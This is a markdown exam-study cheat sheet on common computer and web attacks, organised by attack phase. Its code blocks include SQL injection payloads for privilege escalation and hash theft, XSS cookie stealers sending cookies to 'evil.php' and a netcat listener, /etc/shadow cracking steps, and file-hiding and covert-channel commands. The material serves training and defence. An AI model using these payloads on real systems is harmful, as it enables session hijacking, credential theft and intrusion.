# Common Attacks

## Exam Outcome

Demonstrate a broad knowledge of computer and network attacks

## Common Attacks

## 1. Recon

## 2. Scanning

### NetDiscover

```
netdiscover -i [interface]
```

### enum4linux

```
enum4linux [target IP]
```

### SMB Sessions

View SMB sessions (outbound)

```
net use
```

View SMB sessions (inbound):

```
net session
```

Establishing an SMB session:

```
net use \\%COMPUTERNAME% /u:[account]
```

Delete an SMB session:

```
net use \\%COMPUTERNAME% /del
```

Using the enum tool to pull user, password policy, and grup info:

```
enum -u [user] -p [password] -U [target IP]
enum -u [user] -p [password] -P [target IP]
enum -u [user] -p [password] -G [target IP]
```

### War Dialing

Dialing a sequence of telephone numbers attempting to locate a modem. Popular tool for doing so is HD Moore's WarVOX.

### War Driving

The act of performing wireless LAN discovery.

## 2.  Exploitation

Exploitation (per 504) is broken down into 3 sections:

1. Gaining Access
2. Web App Attacks
3. Denial of Service

## Exploitation - Gaining Access

### IP Address Spoofing

### Passive and Active Sniffing

### Session Hijacking with Ettercap

Session hijacking synthesizes sniffing and spoofing.

### DNS Cache Poisoning

### Buffer Overflows

Allows an attacker to execute arbitrary commands on your machine.

### Format String Attacks

Related to manipulating programs that misuse printf and related commands to read arbitrary information from memory.

### Password Cracking

#### Password Cracking Methodologies

1. Dictionary attack
2. Brute force attack
3. Hybrid

John the Ripper (on Linux):

```
cp /etc/passwd /tmp/passwd_copy
cp /etc/shadow /tmp/shadow_copy

unshadow /tmp/passwd_copy /tmp/shadow_copy > /tmp/combined

/run/john /tmp/combined
```

John the Ripper (on Windows)

```
john-mmx.exe c:\path\to\sam.txt
```

### Pass-the-Hash Attacks

Instead of, or in addition to, stealing password hashes and cracking them, you can also use the pilfered hashes to directly attempt authentication from one box to another.

### Worms & Bots

Worms are designed to be self-propagating and are intended to quickly spread and infect other systems very quickly.
Worms come in different flavors:  multi-exploit, multi-platform, zero-day, flash technique induced, and polymorphic.

### Virtual Machine Attacks

## Exploitation - Web App Attacks

### Account Harvesting

The ability to discern valid userIDs based on how the application responds when the user tried to authenticate. After discerning the error messages, behaviors, and output, automation can be leveraged to quickly identify a list of valid userIDs.

### Command Injection

The manipulation of web application behavior that takes user input and executes it in the back end; bad guys can manipulate this to achieve code execution in certain instances.

### SQL Injection

SQL Injection is the most common web-based attack. It is used when the hacker places commands which can trigger valid SQL queries within a field not typically associated with SQL commands. Fields like "Username" and "Password". But these types of commands cab be inserted into any DB style entry field.

1. List Field Values #1:
An attacker may try the following to see if they can get a list of values from a particular field, user, pass, version, email, etc.

```
'0 OR 1=1'
```

Or:

```
' or '1'='1
```

Equivalent to the SQL Command:
'SELECT * FROM Users WHERE UserId = 0 OR 1=1;''

2. List Field Values #2:
An attacker may try the following to get a list of values from a particular field, user, pass, version, email, etc.
```
" or ""="
```

Equivalent to the SQL Command:
SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""

3. Elevate privileges
```
"john'; INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'"
```

Equivalent to the SQL Command:
SELECT user_id, username, password_hash FROM users WHERE username = 'john'; 
INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'

4. Getting Hashesh

```
admin' union select password from users where username='admin';--
```

### XSS Attacks

1. Black Box Testing
Enter the following in the URL:

```
hxxp://www.site.com/index.php?name=<script>alert(123)</script>
```

2. Search Test
If the site has a search field without proper sanitization:

```
hxxp://www.site.com/search?source=“><script>alert(123)</script>
```

3. One Error Test
If the site has a mouseover or onerror capability

```
hxxp://www.site.com/index.php?name=<b onmouseover=alert('Wufff!')>click me!</b>
```
```
hxxp://www.site.com/index.php?name=<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
```

5. Assessing about:cache Entries (Firefox)

```
Type "about:cache" in the address bar
Click on 'List Cache Entries'
Analyze recent capture entries of attempted XSS entry points
```

4. Cookie Stealer

```
hxxp://www.site.com/index.php?name=<SCRIPT type="text/javascript"> var adr = '../evil.php?cakemonster=' + escape(document.cookie);</SCRIPT>
```

Another example using netcat (nc):

Start a nc listener:

```
nc -l -v -p 2222
```

Enter the following in the script tag:

```
<script>document.location='http://127.0.0.1:2222/grab.cgi?'+document.cookie;</script>
```

The cookie will be relayed to the netcat (nc) listener.

Using the stolen cookie to gain additional access with Nikto:

```
perl ./nikto.pl -Single
[Hostname or IP]: 127.0.0.1
[URL(/)]: /admind.php
[Data]: Cookie: user=1337
```

5. Hide from JavaScript
```
hxxp://www.site.com/index.php?name=<IMG SRC=j&#X41vascript:alert(123)>
```

### Attacking State Maintenance with Web App Manipulation Proxies

Great tools: ZAP, Burp, w3af, and Fiddler.

### Sqlmap

```
sqlmap -u [URL] --data="[parameters]" -p [paramater]
```

## Exploitation - Denial of Service

### Local DOS

### DNS Amplification Attacks

### DoS Suites

### Distributed DoS (DDoS)

## 4. Keeping Access

### App-level Trojan Horse Backdoor Suites

Tools that allow the attacker complete control over a victim machine:  Poison Ivy, VNC (legit, but often abused), Dameware, Sub7 and others.

### Wrappers and Packers

Wrappers are used to bundle two applications together (one legit and the other typically evil).

Packers are primarily used to thwart reverse engineers - by using techniques like compression so that the executable isn't easily reversed and so that strings aren't as readily available.

### Memory Analysis

### User-Mode Rootkits

#### Linux User-Mode Rootkits

Fontanini rootkit.

#### Windows User-Mode Rootkits

### Kernel-Mode Rootkits

#### Rooty
#### Avatar Rootkit
#### Avatar and Alureon

## 5. Covering Tracks

### Covering Tracks in Linux & Unix

#### Hiding Files

```
ls -a
echo hideme > ".. "
ls -a
```

#### Log Editing

Some interesting log sources in Linux:  /var/log/secure; var/log/messages; var/log/httpd/error_log; /var/log/httpd/access_log

#### Accounting Entry Editing

utmp: File contains info about currently logged in users (/var/log/utmp)
wtmp: File contains data about past user logins (/var/log/wtmp)
btmp: File contains bad login entries for failed login attempts (/var/log/btmp)
lastlog: File shows login name, port, and last login for each user (/var/log/lastlog)

### Covering Tracks in Windows

#### Hiding Files

NTFS Alternate Data Streams (ADS)

```
type hackerstuff.exe > notepad.exe:steam1.exe
more < c:\file:stream1
```

Using LADS

```
c:\tools\lads\lads\ /S c:\tmp
```

#### Log Editing

#### Covering Tracks on the Network

#### Reverse HTTP Shells

#### IMCP Tunnels

#### Covert_TCP

```
covert_tcp -dest 127.0.0.1 -source 127.0.0.1 -source_port 8888 -dest_port 9999 -server -file /tmp/receive/receive.txt
```

### Steganography

Sample stego tools:

1. Jsteg
2. MP3Stego
3. S-Mail
4. Invisible Secrets
5. Stash
6. Hydan




